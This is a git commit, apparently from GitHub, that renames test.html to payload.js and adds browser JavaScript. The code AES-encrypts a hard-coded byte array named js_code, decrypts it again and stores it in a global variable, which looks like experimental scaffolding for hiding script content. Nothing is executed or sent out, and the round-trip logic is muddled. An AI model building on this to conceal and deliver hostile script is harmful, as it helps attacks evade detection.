536611a00574d9608d9f120b5cc43350cc5be751
aaaabbbbcccc <78971712+ruchublog@users.noreply.github.com>
2023-07-05 10:36:42 +0800

    Update and rename test.html to payload.js

---
+++ payload.js
@@ -0,0 +1,69 @@
+function encryptData(data, key) {
+    const encodedData = new TextEncoder().encode(data);
+    return window.crypto.subtle.importKey(
+      'raw',
+      key,
+      'AES-CBC',
+      false,
+      ['encrypt']
+    )
+    .then((aesKey) => {
+      const iv = window.crypto.getRandomValues(new Uint8Array(16));
+      return window.crypto.subtle.encrypt(
+        { name: 'AES-CBC', iv: iv },
+        aesKey,
+        encodedData
+      ).then((encryptedData) => {
+        const encryptedBytes = new Uint8Array(encryptedData);
+        const result = new Uint8Array(iv.length + encryptedBytes.length);
+        result.set(iv);
+        result.set(encryptedBytes, iv.length);
+        return result;
+      });
+    });
+  }
+  
+  // 解密
+  function decryptData(encryptedData, key) {
+    const iv = encryptedData.slice(0, 16);
+    const encodedData = encryptedData.slice(16);
+    
+    return window.crypto.subtle.importKey(
+      'raw',
+      key,
+      'AES-CBC',
+      false,
+      ['decrypt']
+    )
+    .then((aesKey) => {
+      return window.crypto.subtle.decrypt(
+        { name: 'AES-CBC', iv: iv },
+        aesKey,
+        encodedData
+      );
+    })
+    .then((decryptedData) => {
+      const decryptedBytes = new Uint8Array(decryptedData);
+      const decoder = new TextDecoder();
+      return decoder.decode(decryptedBytes);
+    });
+  }
+  
+
+  
+  const js_code = new Uint8Array([
+    231, 191, 169, 136, 229, 47, 122, 7, 112, 212, 90, 109, 166, 47, 41, 72, 215, 145, 82, 48, 31, 50, 194, 26, 42, 219, 200, 54, 36, 204, 130, 93
+    ]);;
+
+  encryptData(js_code, window.key)
+    .then((encrypted) => {
+      console.log('Encrypted:', encrypted);
+      console.log(encrypted.toString())
+      
+      decryptData(encrypted, key)
+        .then((decrypted) => {
+            window.js_code=decrypted;
+          console.log('Decrypted:', decrypted);
+          
+        });
+    });
